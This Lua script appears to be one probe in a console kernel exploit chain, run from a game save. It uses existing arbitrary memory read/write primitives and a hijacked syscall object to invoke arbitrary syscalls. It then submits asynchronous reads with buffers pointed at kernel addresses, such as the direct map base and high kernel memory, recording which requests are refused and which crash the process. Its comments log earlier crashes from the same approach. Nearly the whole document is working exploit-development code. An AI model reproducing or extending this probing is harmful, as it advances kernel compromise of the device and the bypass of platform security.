-- CRASH_CLASS: HIGH
-- PROBE 756a: which buffer addresses does the vnode aio path refuse, and which
-- kill the process?
--
-- 755a: doc/../thread.lua with buf=0xFFFFFE0000000000 (direct map base)
-- completes to state 3 with record 8002000E FFFFFFFF 3 0 - EFAULT, clean, and
-- the process stays alive. 748a: the same read with buf=0xFFFFFFFFFF000000 gave
-- create ret=0 and an id, then the process died. Both are kernel addresses, so
-- a single "reject anything above user space" rule does not explain the pair.
--
-- This runs one address at a time in a fixed order, each with its own poll,
-- delete and liveness line, and stops at the first death. Every request is
-- completed before the next is submitted, so the aio queue never blocks.
--
-- Order is chosen so the informative survivors come first and the two addresses
-- that already killed once come last.

print("=== PROBE 756a: AIO BUFFER ADDRESS MATRIX ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local U = function(a) a=to_num(a); return uint64(string.format("0x%08X%08X", math.floor(a/4294967296), a%4294967296)) end
local sc_open = mk(5)
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function call(sc, a1, a2, a3, a4, a5, a6)
    local ok, r = pcall(function() return sc(U(a1), U(a2), U(a3), U(a4), U(a5), U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(U(ts), U(0)) end) end
local function path(s)
    local b = to_num(memory.alloc(#s+1))
    for i=1,#s do memory.write_byte(b+i-1, s:byte(i)) end
    memory.write_byte(b+#s, 0)
    return b
end
print("[A] tid="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))
local fd = call(sc_open, path("/savedata0/thread.lua"), 0, 0, 0, 0, 0)
print("[A] open -> "..tostring(fd))

local D = to_num(memory.alloc(0x2000)); local buf = to_num(memory.alloc(0x2000)); local res = to_num(memory.alloc(0x2000))
local ids = to_num(memory.alloc(0x400)); local st = to_num(memory.alloc(0x400)); local ds = to_num(memory.alloc(0x400))
zero(D,0x2000); zero(buf,0x2000); zero(res,0x2000); zero(st,0x400); zero(ds,0x400)
for k=0,3 do wd(buf+k*4, 0x63636363) end

local function attempt(tag, b)
    zero(D,0x100); zero(res,0x40); zero(st,0x40); zero(ds,0x40)
    wq(D+0x00, uint64(0)); wq(D+0x08, uint64(16))
    wq(D+0x10, uint64(b)); wq(D+0x18, uint64(res))
    wd(D+0x20, fd); wd(D+0x24, 0)
    wd(ids, 0)
    local cr = call(mk(669), 1+0x1000, D, 1, 1, ids, 0)
    local id = rd(ids)
    print(string.format("%s create ret=%s id=%08X", tag, tostring(cr), id))
    if id == 0 or id == -1 then return end
    sleep_ms(60)
    wd(ids, id); call(mk(664), ids, 1, st, 0, 0, 0)
    print(string.format("%s state=%08X res=%X %X %X %X", tag, rd(st), rd(res), rd(res+4), rd(res+8), rd(res+12)))
    wd(ids, id); call(mk(662), ids, 1, ds, 0, 0, 0)
    print(string.format("%s delete=%08X alive=%s", tag, rd(ds), tostring(call(syscall.pipe, 20,0,0,0,0,0,0))))
end

if type(fd) == "number" and fd > 2 then
    attempt("[B] own page", buf)
    attempt("[C] user unmapped", 0x1000)
    attempt("[D] dmap base", 0xFFFFFE0000000000)
    attempt("[E] kernel high", 0xFFFFFFFFFF000000)
    attempt("[F] all ones", 0xFFFFFFFFFFFFFFFF)
end
print("[G] health="..tostring(call(syscall.pipe, 20,0,0,0,0,0,0)))
print("=== 756a DONE ===")
